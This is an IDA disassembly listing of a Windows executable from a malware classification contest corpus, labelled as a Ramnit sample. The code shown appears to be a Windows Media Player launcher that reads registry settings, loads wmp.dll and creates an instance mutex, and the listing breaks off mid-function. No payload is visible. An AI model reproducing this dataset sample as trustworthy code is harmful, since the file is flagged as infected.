		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; [00001000 BYTES: COLLAPSED SEGMENT HEADER. PRESS KEYPAD CTRL-"+" TO EXPAND]
; File Name   :	E:\MLContestSamples\2016_01\PE_RAMNIT_201601\20160206031841.373\140ecacc1a59aae107195e21b167814042618fe0
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	1000000
; Section 1. (virtual address 00001000)
; Virtual size			: 000021B9 (   8633.)
; Section size in file		: 00002200 (   8704.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
;
; Imports from ADVAPI32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
		extrn EventUnregister:dword ; CODE XREF: sub_100269D+1Ap
					; DATA XREF: HEADER:01000114o ...
		extrn EventWrite:dword	; CODE XREF: sub_10026CE+12p
					; DATA XREF: sub_10026CE+12r
		extrn RegCloseKey:dword	; CODE XREF: sub_1001109+59p
					; .text:0100155Dp ...
		extrn RegQueryValueExW:dword ; CODE XREF: sub_1001109+48p
					; .text:01001475p ...
		extrn RegOpenKeyExW:dword ; CODE XREF: sub_1001109+22p
					; .text:01001445p ...
		extrn EventRegister:dword ; CODE XREF: sub_1002671+1Dp
					; DATA XREF: sub_1002671+1Dr

;
; Imports from KERNEL32.dll
;
		extrn GetLastError:dword ; CODE	XREF: .text:loc_1001418p
					; .text:loc_1001DCBp ...
		extrn lstrlenW:dword	; CODE XREF: .text:01001E52p
					; .text:01001E73p ...
		extrn CompareStringOrdinal:dword ; CODE	XREF: sub_1002787+B5p
					; DATA XREF: sub_1002787+B5r
		extrn ExitProcess:dword	; CODE XREF: .text:01002206p
					; DATA XREF: .text:01002206r
		extrn FreeLibrary:dword	; CODE XREF: sub_10012CC+13Ep
					; .text:01001FB0p
					; DATA XREF: ...
		extrn SetErrorMode:dword ; CODE	XREF: .text:01001714p
					; DATA XREF: .text:01001714r
		extrn GetProcAddress:dword ; CODE XREF:	sub_10012CC+10Ap
					; .text:0100166Ep ...
		extrn HeapFree:dword	; CODE XREF: .text:0100153Ep
					; .text:01001551p ...
		extrn SetCurrentDirectoryW:dword ; CODE	XREF: .text:01001525p
					; .text:01001E0Fp
					; DATA XREF: ...
		extrn ExpandEnvironmentStringsW:dword ;	CODE XREF: .text:010014EEp
					; .text:01001519p
					; DATA XREF: ...
		extrn HeapAlloc:dword	; CODE XREF: .text:010014A2p
					; .text:01001501p ...
		extrn SetProcessDEPPolicy:dword	; CODE XREF: .text:01001DF3p
					; DATA XREF: .text:01001DF3r
		extrn CreateMutexW:dword ; CODE	XREF: .text:01001869p
					; DATA XREF: .text:01001869r
		extrn GetStartupInfoW:dword ; CODE XREF: .text:0100185Cp
					; DATA XREF: .text:0100185Cr
		extrn GetProcessHeap:dword ; CODE XREF:	.text:01001831p
					; DATA XREF: .text:01001831r
		extrn SetThreadPriority:dword ;	CODE XREF: .text:0100182Bp
					; DATA XREF: .text:0100182Br
		extrn GetCurrentThread:dword ; CODE XREF: .text:01001824p
					; DATA XREF: .text:01001824r
		extrn LocalFree:dword	; CODE XREF: .text:01001D5Dp
					; .text:loc_1002171p
					; DATA XREF: ...
		extrn LoadLibraryW:dword ; CODE	XREF: .text:0100161Cp
					; .text:01001D3Dp ...
		extrn FormatMessageW:dword ; CODE XREF:	.text:01001D2Ap
					; .text:0100200Bp ...
		extrn GetCommandLineW:dword ; CODE XREF: .text:010017C7p
					; DATA XREF: .text:010017C7r
		extrn GetModuleHandleW:dword ; CODE XREF: .text:0100179Dp
					; DATA XREF: .text:0100179Dr
		extrn CloseHandle:dword	; CODE XREF: .text:01001C8Cp
					; .text:01001D7Ep ...
		extrn SetEvent:dword	; CODE XREF: .text:01001C85p
					; DATA XREF: .text:01001C85r
		extrn OpenEventW:dword	; CODE XREF: .text:0100177Fp
					; DATA XREF: .text:0100177Fr
		extrn QueryPerformanceCounter:dword ; CODE XREF: sub_1001242+45p
					; DATA XREF: sub_1001242+45r
		extrn GetTickCount:dword ; CODE	XREF: sub_1001242+39p
					; DATA XREF: sub_1001242+39r
		extrn GetCurrentThreadId:dword ; CODE XREF: sub_1001242+31p
					; DATA XREF: sub_1001242+31r
		extrn GetCurrentProcessId:dword	; CODE XREF: sub_1001242+29p
					; DATA XREF: sub_1001242+29r
		extrn GetSystemTimeAsFileTime:dword ; CODE XREF: sub_1001242+1Dp
					; DATA XREF: sub_1001242+1Dr
		extrn TerminateProcess:dword ; CODE XREF: sub_1002928+DAp
					; DATA XREF: sub_1002928+DAr
		extrn GetCurrentProcess:dword ;	CODE XREF: sub_1002928+D3p
					; DATA XREF: sub_1002928+D3r
		extrn UnhandledExceptionFilter:dword ; CODE XREF: sub_1002928+C2p
					; DATA XREF: sub_1002928+C2r
		extrn SetUnhandledExceptionFilter:dword	; CODE XREF: sub_1002928+B7p
					; DATA XREF: sub_1002928+B7r
		extrn LoadLibraryA:dword ; CODE	XREF: sub_10012CC+C1p
					; DATA XREF: sub_10012CC+C1r
; LONG __fastcall InterlockedExchange(volatile LONG *Target, LONG Value)
		extrn InterlockedExchange:dword	; CODE XREF: sub_10012CC+D5p
					; DATA XREF: sub_10012CC+D5r
		extrn LocalAlloc:dword	; CODE XREF: sub_10012CC+113Bp
					; DATA XREF: sub_10012CC+113Br
		extrn RaiseException:dword ; CODE XREF:	sub_10012CC+10BAp
					; sub_10012CC+1129p ...

;
; Imports from USER32.dll
;
		extrn SetForegroundWindow:dword	; CODE XREF: sub_1002787+D5p
					; DATA XREF: sub_1002787+D5r ...
		extrn GetClassNameW:dword ; CODE XREF: sub_1002787+9Cp
					; DATA XREF: sub_1002787+9Cr
		extrn GetParent:dword	; CODE XREF: sub_1002787+76p
					; DATA XREF: sub_1002787+76r
		extrn GetDesktopWindow:dword ; CODE XREF: sub_1002787+50p
					; DATA XREF: sub_1002787+50r
		extrn GetWindowThreadProcessId:dword ; CODE XREF: sub_1002787+4Ap
					; sub_1002787+67p
					; DATA XREF: ...
		extrn IsWindowVisible:dword ; CODE XREF: sub_1002787+34p
					; DATA XREF: sub_1002787+34r
		extrn GetWindow:dword	; CODE XREF: sub_1002787+22p
					; sub_1002787+59p ...
		extrn MessageBoxW:dword	; CODE XREF: .text:01001D51p
					; .text:01002032p ...
		extrn GetSystemMetrics:dword ; CODE XREF: .text:01001805p
					; DATA XREF: .text:01001805r
		extrn SendMessageTimeoutW:dword	; CODE XREF: sub_10026EF+52p
					; DATA XREF: sub_10026EF+52r
		extrn FindWindowW:dword	; CODE XREF: .text:01001D90p
					; sub_10026EF+16p
					; DATA XREF: ...
		extrn ShowWindow:dword	; CODE XREF: sub_1002787+EDp
					; DATA XREF: sub_1002787+EDr
		extrn IsIconic:dword	; CODE XREF: sub_1002787+DEp
					; DATA XREF: sub_1002787+DEr

;
; Imports from ntdll.dll
;
; void *__cdecl	memset(void *, int, size_t)
		extrn __imp_memset:dword ; DATA	XREF: memsetr .text:01002BD4o

;
; Imports from WS2_32.dll
;
		extrn WSACleanup:dword	; CODE XREF: .text:01001FBEp
					; DATA XREF: .text:01001FBEr ...
		extrn WSAStartup:dword	; CODE XREF: .text:01001F92p
					; DATA XREF: .text:01001F92r


; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 1001104h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001109	proc near		; CODE XREF: .text:loc_1001813p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

; FUNCTION CHUNK AT 01001AD1 SIZE 0000000F BYTES

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		lea	eax, [ebp+var_4]
		push	eax
		push	20019h
		xor	ebx, ebx
		push	ebx
		push	offset aSoftwareMicros ; "Software\\Microsoft\\MediaPlayer\\Setup"
		push	80000002h
		mov	[ebp+var_4], ebx
		call	ds:RegOpenKeyExW
		test	eax, eax
		jnz	short loc_1001168
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	ebx
		push	ebx
		push	offset aInstallresult ;	"InstallResult"
		push	[ebp+var_4]
		mov	[ebp+var_8], ebx
		mov	[ebp+var_C], 4
		call	ds:RegQueryValueExW
		test	eax, eax
		jz	loc_1001AD1

loc_100115F:				; CODE XREF: sub_1001109+9D2j
		push	[ebp+var_4]
		call	ds:RegCloseKey

loc_1001168:				; CODE XREF: sub_1001109+2Aj
		mov	al, bl
		pop	ebx
		leave
		retn
sub_1001109	endp

; ---------------------------------------------------------------------------
		align 10h
aInstallresult:				; DATA XREF: sub_1001109+36o
		unicode	0, <InstallResult>,0
		align 10h
aSoftwareMicros:			; DATA XREF: sub_1001109+15o
		unicode	0, <Software\Microsoft\MediaPlayer\Setup>,0
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10011DF	proc near		; CODE XREF: .text:0100156Fp

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

; FUNCTION CHUNK AT 010019B1 SIZE 0000007B BYTES
; FUNCTION CHUNK AT 01001AE0 SIZE 00000075 BYTES

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		xor	esi, esi
		mov	[ebp+var_8], esi
		mov	[ebp+var_C], esi
		mov	[ebp+var_10], esi
		mov	[ebp+var_14], esi
		mov	[ebp+var_1], 1
		cmp	[ebp+arg_0], esi
		jz	loc_10019B1
		push	offset aSkipfue	; "/SkipFUE"
		push	[ebp+arg_0]
		call	sub_1001943
		pop	ecx
		pop	ecx
		test	eax, eax
		jz	loc_10019B1
		xor	al, al

loc_100121C:				; CODE XREF: sub_10011DF+848j
		pop	esi
		leave
		retn	4
sub_10011DF	endp

; ---------------------------------------------------------------------------
		align 4
aSkipfue:				; DATA XREF: sub_10011DF+24o
		unicode	0, </SkipFUE>,0
; ---------------------------------------------------------------------------
		mov	eax, offset OleInitialize
		jmp	short loc_10012B6
; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001242	proc near		; CODE XREF: .text:0100176Dp

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

; FUNCTION CHUNK AT 0100236A SIZE 0000000A BYTES

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, dword_1004040
		sub	esp, 10h
		test	eax, eax
		jz	short loc_100125A
		cmp	eax, 0BB40E64Eh
		jnz	short loc_100129E

loc_100125A:				; CODE XREF: sub_1001242+Fj
		push	esi
		lea	eax, [ebp+var_8]
		push	eax
		call	ds:GetSystemTimeAsFileTime
		mov	esi, [ebp+var_4]
		xor	esi, [ebp+var_8]
		call	ds:GetCurrentProcessId
		xor	esi, eax
		call	ds:GetCurrentThreadId
		xor	esi, eax
		call	ds:GetTickCount
		xor	esi, eax
		lea	eax, [ebp+var_10]
		push	eax
		call	ds:QueryPerformanceCounter
		mov	eax, [ebp+var_C]
		xor	eax, [ebp+var_10]
		xor	esi, eax
		mov	eax, esi
		jnz	short loc_10012A7
		jmp	loc_100236A
; ---------------------------------------------------------------------------

loc_100129E:				; CODE XREF: sub_1001242+16j
					; sub_1001242+6Bj
		not	eax
		mov	dword_1004044, eax
		leave
		retn
; ---------------------------------------------------------------------------

loc_10012A7:				; CODE XREF: sub_1001242+55j
					; sub_1001242+112Dj
		mov	dword_1004040, eax
		pop	esi
		jmp	short loc_100129E
sub_1001242	endp

; ---------------------------------------------------------------------------
		mov	eax, offset CoInitializeSecurity
		jmp	short $+2
; ---------------------------------------------------------------------------

loc_10012B6:				; CODE XREF: .text:0100123Bj
					; .text:010012B4j ...
		push	ecx
		push	edx
		push	eax
		push	offset ole32_dll_import_table
		call	sub_10012CC
		pop	edx
		pop	ecx
		jmp	eax
; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10012CC	proc near		; CODE XREF: .text:010012BEp
					; .text:01002A42p

var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_18		= dword	ptr -18h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

; FUNCTION CHUNK AT 01002374 SIZE 00000165 BYTES

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	ebx
		mov	eax, offset __ImageBase
		push	esi
		mov	esi, [ebp+arg_0]
		mov	edx, [esi+8]
		mov	ecx, [esi+4]
		mov	ebx, [esi+0Ch]
		add	edx, eax
		push	edi
		mov	edi, [esi+14h]
		add	edi, eax
		add	ecx, eax
		mov	[ebp+var_18], edx
		mov	edx, [esi+10h]
		add	ebx, eax
		add	edx, eax
		mov	eax, [esi+1Ch]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_38], ecx
		xor	ecx, ecx
		mov	[ebp+var_C], edi
		mov	[ebp+var_3C], eax
		xor	eax, eax
		test	dword ptr [esi], 1
		lea	edi, [ebp+var_30]
		mov	[ebp+var_44], 24h
		mov	[ebp+var_40], esi
		mov	[ebp+var_34], ecx
		stosd
		mov	[ebp+var_2C], ecx
		mov	[ebp+var_28], ecx
		mov	[ebp+var_24], ecx
		jz	loc_1002374
		mov	eax, [ebp+var_18]
		mov	edi, [eax]
		mov	eax, [ebp+arg_4]
		sub	eax, ebx
		sar	eax, 2
		shl	eax, 2
		add	edx, eax
		mov	edx, [edx]
		mov	[ebp+arg_0], eax
		mov	eax, edx
		shr	eax, 1Fh
		not	eax
		and	eax, 1
		mov	[ebp+var_34], eax
		lea	eax, word_1000002[edx]
		jz	loc_1002393

loc_1001367:				; CODE XREF: sub_10012CC+10CAj
		mov	[ebp+var_30], eax
		mov	eax, ds:dword_1001414
		xor	ebx, ebx
		cmp	eax, ecx
		jnz	loc_100239B

loc_1001379:				; CODE XREF: sub_10012CC+10DAj
		test	edi, edi
		jnz	short loc_10013B5
		mov	eax, ds:dword_1001414
		test	eax, eax
		jnz	loc_10023B1

loc_100138A:				; CODE XREF: sub_10012CC+139j
		push	[ebp+var_38]
		call	ds:LoadLibraryA
		mov	edi, eax
		test	edi, edi
		jz	loc_10023BE

loc_100139D:				; CODE XREF: sub_10012CC+13Bj
					; sub_10012CC+1110j
		push	edi
		push	[ebp+var_18]
		call	ds:InterlockedExchange
		cmp	eax, edi
		jz	short loc_1001409
		cmp	dword ptr [esi+18h], 0
		jnz	loc_1002403

loc_10013B5:				; CODE XREF: sub_10012CC+AFj
					; sub_10012CC+144j ...
		mov	eax, ds:dword_1001414
		mov	[ebp+var_2C], edi
		test	eax, eax
		jnz	loc_100242A

loc_10013C5:				; CODE XREF: sub_10012CC+1168j
		test	ebx, ebx
		jnz	short loc_10013E6
		cmp	[esi+14h], ebx
		jnz	loc_1002439

loc_10013D2:				; CODE XREF: sub_10012CC+1170j
					; sub_10012CC+1181j ...
		push	[ebp+var_30]
		push	edi
		call	ds:GetProcAddress
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_100247E

loc_10013E6:				; CODE XREF: sub_10012CC+FBj
					; sub_10012CC+11ADj ...
		mov	eax, [ebp+arg_4]
		mov	[eax], ebx

loc_10013EB:				; CODE XREF: sub_10012CC+10E0j
		mov	eax, ds:dword_1001414
		test	eax, eax
		jnz	loc_10024C2

loc_10013F8:				; CODE XREF: sub_10012CC+1208j
		mov	eax, ebx

loc_10013FA:				; CODE XREF: sub_10012CC+10C2j
					; sub_10012CC+1132j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------

loc_1001401:				; CODE XREF: sub_10012CC+10EDj
		mov	edi, eax
		test	edi, edi
		jz	short loc_100138A
		jmp	short loc_100139D
; ---------------------------------------------------------------------------

loc_1001409:				; CODE XREF: sub_10012CC+DDj
		push	edi
		call	ds:FreeLibrary
		jmp	short loc_10013B5
sub_10012CC	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
dword_1001414	dd 0			; DATA XREF: sub_10012CC+9Er
					; sub_10012CC+B1r ...
; ---------------------------------------------------------------------------

loc_1001418:				; CODE XREF: .text:01001D70j
		call	ds:GetLastError
		cmp	eax, 0B7h
		jz	loc_1001D78
		jmp	loc_1001DDA
; ---------------------------------------------------------------------------

loc_100142E:				; CODE XREF: .text:01001E04j
		lea	eax, [ebp-1B8h]
		push	eax
		push	20019h
		push	ebx
		push	offset aSoftwareMicr_0 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVe"...
		push	80000002h
		call	ds:RegOpenKeyExW
		test	eax, eax
		jnz	loc_1001569
		mov	esi, ds:RegQueryValueExW
		lea	eax, [ebp-1C4h]
		push	eax
		push	ebx
		lea	eax, [ebp-1BCh]
		push	eax
		push	ebx
		mov	edi, offset aPath ; "Path"
		push	edi
		push	dword ptr [ebp-1B8h]
		call	esi ; RegQueryValueExW
		test	eax, eax
		jnz	loc_1001557
		cmp	dword ptr [ebp-1BCh], 1
		jz	short loc_1001495
		cmp	dword ptr [ebp-1BCh], 2
		jnz	loc_1001557

loc_1001495:				; CODE XREF: .text:01001486j
		push	dword ptr [ebp-1C4h]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapAlloc
		mov	[ebp-1A8h], eax
		cmp	eax, ebx
		jz	loc_1001557
		lea	ecx, [ebp-1C4h]
		push	ecx
		push	eax
		lea	eax, [ebp-1BCh]
		push	eax
		push	ebx
		push	edi
		push	dword ptr [ebp-1B8h]
		call	esi ; RegQueryValueExW
		test	eax, eax
		jnz	short loc_1001544
		cmp	dword ptr [ebp-1BCh], 2
		jnz	loc_1001E09
		mov	esi, ds:ExpandEnvironmentStringsW
		push	ebx
		push	ebx
		push	dword ptr [ebp-1A8h]
		call	esi ; ExpandEnvironmentStringsW
		mov	edi, eax
		cmp	edi, ebx
		jz	short loc_1001544
		lea	eax, [edi+edi]
		push	eax
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapAlloc
		mov	[ebp-1ACh], eax
		cmp	eax, ebx
		jz	short loc_1001544
		push	edi
		push	eax
		push	dword ptr [ebp-1A8h]
		call	esi ; ExpandEnvironmentStringsW
		test	eax, eax
		jz	short loc_1001531
		push	dword ptr [ebp-1ACh]
		call	ds:SetCurrentDirectoryW
		mov	[ebp-19Ch], eax

loc_1001531:				; CODE XREF: .text:0100151Dj
		push	dword ptr [ebp-1ACh]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapFree

loc_1001544:				; CODE XREF: .text:010014D1j
					; .text:010014F4j ...
		push	dword ptr [ebp-1A8h]
		push	ebx
		push	dword ptr [ebp-1B4h]
		call	ds:HeapFree

loc_1001557:				; CODE XREF: .text:01001479j
					; .text:0100148Fj ...
		push	dword ptr [ebp-1B8h]
		call	ds:RegCloseKey
		mov	[ebp-1B8h], ebx

loc_1001569:				; CODE XREF: .text:0100144Dj
		push	dword ptr [ebp-1A4h]
		call	sub_10011DF
		test	al, al
		jz	loc_1001F5A
		jmp	loc_1001E20
; ---------------------------------------------------------------------------
		align 4
aPath:					; DATA XREF: .text:01001469o
		unicode	0, <Path>,0
		align 10h
aSoftwareMicr_0:			; DATA XREF: .text:0100143Bo
		unicode	0, <SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\wmpla>
		unicode	0, <yer.exe>,0
		align 4

loc_1001614:				; CODE XREF: .text:01001F81j
		add	esp, 0Ch
		push	offset aWmp_dll	; "wmp.dll"
		call	ds:LoadLibraryW
		mov	edi, eax
		cmp	edi, ebx
		jz	loc_1001FDC
		push	ebx
		call	OleInitialize
		push	ebx
		push	ebx
		push	ebx
		push	3
		push	ebx
		push	ebx
		push	ebx
		push	0FFFFFFFFh
		push	ebx
		call	CoInitializeSecurity
		jmp	loc_1001F86
; ---------------------------------------------------------------------------
		align 4
aWmp_dll:				; DATA XREF: .text:01001617o
		unicode	0, <wmp.dll>,0
; ---------------------------------------------------------------------------

loc_100165C:				; CODE XREF: .text:01001F98j
		mov	esi, ds:GetProcAddress
		push	0BB8h
		push	edi
		mov	[ebp-1E0h], eax
		call	esi ; GetProcAddress
		push	0BB9h
		push	edi
		mov	[ebp-1A8h], eax
		call	esi ; GetProcAddress
		push	0BBDh
		push	edi
		mov	[ebp-1ACh], eax
		call	esi ; GetProcAddress
		push	offset aDllcanunloadno ; "DllCanUnloadNow"
		push	edi
		mov	[ebp-19Ch], eax
		call	esi ; GetProcAddress
		mov	esi, eax
		cmp	[ebp-1A8h], ebx
		jz	loc_1001AC4
		cmp	[ebp-1ACh], ebx
		jz	loc_1001AC4
		cmp	[ebp-19Ch], ebx
		jz	loc_1001AC4
		cmp	esi, ebx
		jz	loc_1001FAF
		cmp	[ebp-19Dh], bl
		jnz	short loc_10016DE
		call	dword ptr [ebp-19Ch]
		test	al, al
		jnz	loc_1001F9D

loc_10016DE:				; CODE XREF: .text:010016CEj
		lea	eax, [ebp-1C8h]
		push	eax
		lea	eax, [ebp-1D4h]
		push	eax
		lea	eax, [ebp-1D0h]
		push	eax
		lea	eax, [ebp-1CCh]
		push	eax
		lea	eax, [ebp-1C0h]
		push	eax
		call	dword ptr [ebp-1ACh]
		test	eax, eax
		jnz	loc_1001AC4
		push	8001h
		call	ds:SetErrorMode
		test	byte ptr [ebp-21Ch], 1
		jz	loc_1001ABC
		movzx	eax, word ptr [ebp-218h]

loc_100172E:				; CODE XREF: .text:01001ABFj
		push	eax
		push	dword ptr [ebp-1A4h]
		push	dword ptr [ebp-1DCh]
		call	dword ptr [ebp-1A8h]
		cmp	eax, 80070005h
		mov	[ebp-1D8h], eax
		setnz	byte ptr [ebp-195h]
		jmp	loc_1001AC4
; ---------------------------------------------------------------------------
aDllcanunloadno	db 'DllCanUnloadNow',0  ; DATA XREF: .text:0100168Co
		db 5 dup(90h)
; ---------------------------------------------------------------------------
		call	sub_1001242
		jmp	loc_1001BE8
; ---------------------------------------------------------------------------

loc_1001777:				; CODE XREF: .text:01001C26j
					; .text:01001C37j ...
		push	offset aWmpperf_proc_s ; "WMPPERF_PROC_START"
		push	ebx
		push	2
		call	ds:OpenEventW
		mov	edi, eax
		cmp	edi, ebx
		jnz	loc_1001C84

loc_100178F:				; CODE XREF: .text:01001C92j
		push	ebx
		mov	[ebp-1D8h], ebx
		mov	byte ptr [ebp-196h], 1
		call	ds:GetModuleHandleW
		mov	[ebp-1DCh], eax
		mov	[ebp-1C0h], ebx
		mov	[ebp-1CCh], ebx
		mov	[ebp-1D0h], ebx
		mov	[ebp-1D4h], ebx
		mov	[ebp-1C8h], ebx
		call	ds:GetCommandLineW
		push	offset aSuppressdialog ; "/SuppressDialogs"
		push	eax
		mov	[ebp-1A4h], eax
		call	sub_1001943
		push	offset aSafemodeok ; "/SafeModeOK"
		push	dword ptr [ebp-1A4h]
		test	eax, eax
		setnz	byte ptr [ebp-19Dh]
		call	sub_1001943
		add	esp, 10h
		test	eax, eax
		push	43h
		setnz	byte ptr [ebp-195h]
		call	ds:GetSystemMetrics
		test	eax, eax
		jnz	loc_1001C97

loc_1001813:				; CODE XREF: .text:01001C9Dj
		call	sub_1001109
		test	al, al
		jnz	loc_1001D07
		xor	edi, edi
		inc	edi
		push	edi
		call	ds:GetCurrentThread
		push	eax
		call	ds:SetThreadPriority
		call	ds:GetProcessHeap
		mov	[ebp-1B4h], eax
		cmp	eax, ebx
		jz	loc_1001CA3
		lea	eax, [ebp-248h]
		push	eax
		mov	[ebp-21Ch], ebx
		mov	dword ptr [ebp-248h], 44h
		call	ds:GetStartupInfoW
		push	offset aLocalMicrosoft ; "Local\\Microsoft_WMP_70_CheckForOtherIn"...
		push	edi
		push	ebx
		call	ds:CreateMutexW
		jmp	loc_1001D68
; ---------------------------------------------------------------------------
		align 8
aLocalMicrosoft:			; DATA XREF: .text:01001862o
		unicode	0, <Local\Microsoft_WMP_70_CheckForOtherInstanceMutex>,0
aSafemodeok:				; DATA XREF: .text:010017DEo
		unicode	0, </SafeModeOK>,0
aSuppressdialog:			; DATA XREF: .text:010017CDo
		unicode	0, </SuppressDialogs>,0
		align 4
aWmpperf_proc_s:			; DATA XREF: .text:loc_1001777o
		unicode	0, <WMPPERF_PROC_START>,0
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001943	proc near		; CODE XREF: sub_10011DF+2Cp
					; .text:010017D9p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		push	ebx
		mov	ebx, [ebp+arg_4]
		cmp	word ptr [ebx],	0
		push	edi
		mov	edi, eax
		jz	short loc_100199F
		movzx	ecx, word ptr [eax]
		test	cx, cx
		jz	short loc_100199D
		movzx	edx, cx
		sub	eax, ebx
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop

loc_1001970:				; CODE XREF: sub_1001943+58j
		mov	ecx, [ebp+arg_4]
		test	dx, dx
		jz	short loc_100198B

loc_1001978:				; CODE XREF: sub_1001943+66j
		movzx	edx, word ptr [ecx]
		test	dx, dx
		jz	short loc_10019AD
		movzx	ebx, word ptr [eax+ecx]
		movzx	edx, dx
		sub	ebx, edx
		jz	short loc_10019A3

loc_100198B:				; CODE XREF: sub_1001943+33j
					; sub_1001943+68j
		cmp	word ptr [ecx],	0
		jz	short loc_10019AD
		inc	edi
		inc	edi
		movzx	edx, word ptr [edi]
		inc	eax
		inc	eax
		test	dx, dx
		jnz	short loc_1001970

loc_100199D:				; CODE XREF: sub_1001943+1Bj
		xor	eax, eax

loc_100199F:				; CODE XREF: sub_1001943+13j
					; sub_1001943+6Cj
		pop	edi
		pop	ebx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_10019A3:				; CODE XREF: sub_1001943+46j
		inc	ecx
		inc	ecx
		cmp	[eax+ecx], bx
		jnz	short loc_1001978
		jmp	short loc_100198B
; ---------------------------------------------------------------------------

loc_10019AD:				; CODE XREF: sub_1001943+3Bj
					; sub_1001943+4Cj
		mov	eax, edi
		jmp	short loc_100199F
sub_1001943	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_10011DF

loc_10019B1:				; CODE XREF: sub_10011DF+1Ej
					; sub_10011DF+35j
		push	ebx
		mov	ebx, ds:RegOpenKeyExW
		push	edi
		lea	eax, [ebp+var_8]
		push	eax
		push	3
		push	esi
		mov	edi, offset aSoftwareMicr_1 ; "SOFTWARE\\Microsoft\\MediaPlayer\\Prefe"...
		push	edi
		mov	esi, 80000001h
		push	esi
		call	ebx ; RegOpenKeyExW
		test	eax, eax
		jnz	loc_1001AE0
		push	4
		pop	esi
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_14]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		push	0
		push	offset aAcceptedprivac ; "AcceptedPrivacyStatement"
		push	[ebp+var_8]
		mov	[ebp+var_C], esi
		call	ds:RegQueryValueExW
		test	eax, eax
		jnz	short loc_1001A0B
		cmp	[ebp+var_10], esi
		jnz	short loc_1001A0B
		cmp	[ebp+var_14], 1
		jnz	short loc_1001A0B

loc_1001A07:				; CODE XREF: sub_10011DF+90Fj
		mov	[ebp+var_1], 0

loc_1001A0B:				; CODE XREF: sub_10011DF+81Bj
					; sub_10011DF+820j ...
		push	[ebp+var_8]
		call	ds:RegCloseKey
		and	[ebp+var_8], 0
		cmp	[ebp+var_1], 0
		jnz	loc_1001AF4

loc_1001A22:				; CODE XREF: sub_10011DF+92Ej
					; sub_10011DF+971j
		mov	al, [ebp+var_1]
		pop	edi
		pop	ebx
		jmp	loc_100121C
; END OF FUNCTION CHUNK	FOR sub_10011DF
; ---------------------------------------------------------------------------
		align 10h
aSoftwareMicr_1:			; DATA XREF: sub_10011DF+7E1o
		unicode	0, <SOFTWARE\Microsoft\MediaPlayer\Preferences>,0
		align 4
aAcceptedprivac:			; DATA XREF: sub_10011DF+808o
		unicode	0, <AcceptedPrivacyStatement>,0
		align 4

loc_1001ABC:				; CODE XREF: .text:01001721j
		push	0Ah
		pop	eax
		jmp	loc_100172E
; ---------------------------------------------------------------------------

loc_1001AC4:				; CODE XREF: .text:010016A2j
					; .text:010016AEj ...
		cmp	esi, ebx
		jnz	loc_1001FA9
		jmp	loc_1001FAF
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_1001109

loc_1001AD1:				; CODE XREF: sub_1001109+50j
		cmp	[ebp+var_8], 0D2AF9h
		setz	bl
		jmp	loc_100115F
; END OF FUNCTION CHUNK	FOR sub_1001109
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_10011DF

loc_1001AE0:				; CODE XREF: sub_10011DF+7F1j
		lea	eax, [ebp+var_8]
		push	eax
		push	1
		push	0
		push	edi
		push	esi
		call	ebx ; RegOpenKeyExW
		test	eax, eax
		jz	loc_1001A07

loc_1001AF4:				; CODE XREF: sub_10011DF+83Dj
		lea	eax, [ebp+var_8]
		push	eax
		push	20019h
		push	0
